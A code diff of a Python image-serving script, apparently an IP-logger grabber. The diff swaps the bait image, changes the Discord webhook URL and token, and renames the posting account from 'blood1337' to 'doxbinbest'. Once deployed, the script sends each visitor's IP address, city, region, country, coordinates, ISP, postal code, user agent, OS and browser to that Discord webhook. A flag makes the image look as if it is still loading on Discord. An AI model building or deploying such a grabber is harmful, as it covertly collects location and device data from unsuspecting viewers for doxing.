@@ -2,14 +2,14 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'https://discord.com/api/webhooks/1146385706160226424/6nJfbRi-9PeB1hO8AGC-sWUJTN-XtB2Y4KjiXvITfyvzdUsUkukCqcyNJepczFHk8qN6'
-bindata = requests.get('https://cdn.discordapp.com/attachments/1143934853860053013/1146386172482957323/image.png').content
+webhook = 'https://discord.com/api/webhooks/1155197665831825408/DuRcUGyRKz33GMBfh_LsN19WrUjRIFKndvi_2GZXXy102nHIyIOZAPv5ot2rg9N6t2Qv'
+bindata = requests.get('https://cdn.discordapp.com/attachments/1140372792324403210/1155197877648367808/indir_43.jpg').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
 def formatHook(ip,city,reg,country,loc,org,postal,useragent,os,browser):
     return {
-  "username": "blood1337",
+  "username": "doxbinbest",
   "content": "@everyone",
   "embeds": [
     {
